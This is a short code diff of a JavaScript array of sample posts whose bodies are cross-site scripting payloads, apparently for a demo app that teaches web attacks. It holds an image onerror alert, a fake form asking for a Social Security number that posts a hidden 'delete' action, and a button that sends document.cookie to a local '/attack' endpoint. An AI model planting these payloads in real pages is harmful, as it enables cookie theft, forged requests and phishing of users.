@@ -9,7 +9,7 @@ const tweets = [
     body: `<img src="" onerror="alert('if you see this alert pop up on your screen, then this page is prone to an XSS attack')">`
   },
   {
-    body: `<form onsubmit="alert('You got DUPED -MaliciousUser')"><label>Social Security Number: <input type="number"></label><button>Submit</button></form>`
+    body: `<form method="post" action="/"><label>Social Security Number: <input type="number"></label><input type="hidden" name="action" value="delete"></label><button>Submit</button></form>`
   },
   {
     body: `<button id="mal" onclick="(() => {const link='http://localhost:5002/attack?cookies='+encodeURIComponent(document.cookie);navigator.clipboard.writeText(link);document.querySelector('#mal').outerHTML='Open the copied link in incognito';})();">Copy Malicious Link</button>`
